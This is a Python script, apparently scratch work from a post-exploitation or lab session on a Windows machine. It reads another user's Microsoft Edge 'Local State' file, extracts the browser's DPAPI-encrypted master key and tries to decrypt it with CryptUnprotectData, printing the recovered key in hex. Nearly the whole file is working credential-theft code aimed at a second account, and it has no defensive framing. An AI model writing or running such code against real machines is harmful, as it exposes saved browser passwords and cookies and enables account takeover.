import os, json, base64, struct, subprocess, ctypes
from ctypes import wintypes

# Try to use DPAPI via Win32 API
# First, let's try to decrypt the Edge key using CryptUnprotectData

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]

def get_data_blob(data):
    if data is None:
        return DATA_BLOB(0, None)
    buf = (ctypes.c_byte * len(data)).from_buffer_copy(data)
    return DATA_BLOB(len(data), buf)

def decrypt_with_dpapi(data, entropy=None, optional=False):
    crypt32 = ctypes.windll.crypt32
    in_blob = get_data_blob(data)
    entropy_blob = get_data_blob(entropy)
    out_blob = DATA_BLOB()
    flags = 0
    if optional:
        flags |= 1  # CRYPTPROTECT_UI_FORBIDDEN
    
    result = crypt32.CryptUnprotectData(
        ctypes.byref(in_blob),
        None,
        ctypes.byref(entropy_blob) if entropy else None,
        None,
        None,
        flags,
        ctypes.byref(out_blob)
    )
    
    if result:
        decrypted = ctypes.string_at(out_blob.pbData, out_blob.cbData)
        crypt32.LocalFree(out_blob.pbData)
        return decrypted
    else:
        error = ctypes.GetLastError()
        return None

# Read Edge encrypted key
with open(r"C:\Users\osiris_admin\AppData\Local\Microsoft\Edge\User Data\Local State", "r") as f:
    local_state = json.load(f)
encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
encrypted_key = base64.b64decode(encrypted_key_b64)
# Skip 'DPAPI' header
ciphertext = encrypted_key[5:]

print("Trying DPAPI decrypt (as current user - basedgod)...")
result = decrypt_with_dpapi(ciphertext)
if result:
    print("SUCCESS! Decrypted key: %s" % result.hex())
else:
    error = ctypes.GetLastError()
    print("Failed with error code: %d (0x%08X)" % (error, error))
    print("Expected - we're running as basedgod, need osiris_admin context")

# Let's check what user we are
import win32api
try:
    username = win32api.GetUserName()
    print("Current user: %s" % username)
except:
    print("Could not get username")
